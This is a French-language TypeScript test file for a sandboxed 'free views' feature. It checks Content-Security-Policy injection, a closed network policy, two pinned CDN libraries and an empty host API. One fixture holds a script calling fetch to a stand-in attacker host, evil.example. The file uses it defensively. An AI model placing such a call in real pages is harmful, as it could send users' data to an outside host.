import { BIBLIOTHEQUES_ADMISES, POLITIQUE_CONTENU, avecPolitiqueDeContenu, chargeurVuesLibres } from './vues-libres';

describe('vues libres (KAN-95)', () => {
  it('pose la politique de contenu avant tout le code généré', () => {
    const html = avecPolitiqueDeContenu('<html><head><title>x</title><script>fetch("https://evil.example")</script></head><body></body></html>');

    expect(html.indexOf('Content-Security-Policy')).toBeLessThan(html.indexOf('<script>'));
    expect(html.indexOf('Content-Security-Policy')).toBeGreaterThan(html.indexOf('<head>'));
  });

  it('crée une tête quand le document n\'en a pas', () => {
    const html = avecPolitiqueDeContenu('<body>bonjour</body>');

    expect(html.startsWith('<head><meta http-equiv="Content-Security-Policy"')).toBe(true);
  });

  it('ferme le réseau et ne laisse passer que deux bibliothèques exactes', () => {
    expect(POLITIQUE_CONTENU).toContain("connect-src 'none'");
    expect(POLITIQUE_CONTENU).toContain("default-src 'none'");
    expect(POLITIQUE_CONTENU).toContain("form-action 'none'");
    for (const adresse of BIBLIOTHEQUES_ADMISES) {
      expect(adresse).toMatch(/^https:\/\/cdn\.jsdelivr\.net\/npm\/[a-z0-9.-]+@\d+\.\d+\.\d+\/dist\/[\w.]+\.js$/);
      expect(POLITIQUE_CONTENU).toContain(adresse);
    }
    expect(POLITIQUE_CONTENU).not.toContain('*');
  });

  it('ne donne aucune fonction de l\'hôte à la vue, quoi que la bibliothèque demande', async () => {
    const create = vi.fn().mockReturnValue({});
    const moteur = { create } as never;

    const charge = await chargeurVuesLibres(async () => moteur)();
    (charge as unknown as { create: (api: unknown, options: { frameContent: string }) => unknown }).create(
      { lireTout: () => 'secret' },
      { frameContent: '<head></head><body>x</body>' }
    );

    const [api, options] = create.mock.calls[0] as [Record<string, unknown>, { frameContent: string }];
    expect(Object.keys(api)).toEqual([]);
    expect(options.frameContent).toContain("connect-src 'none'");
  });
});
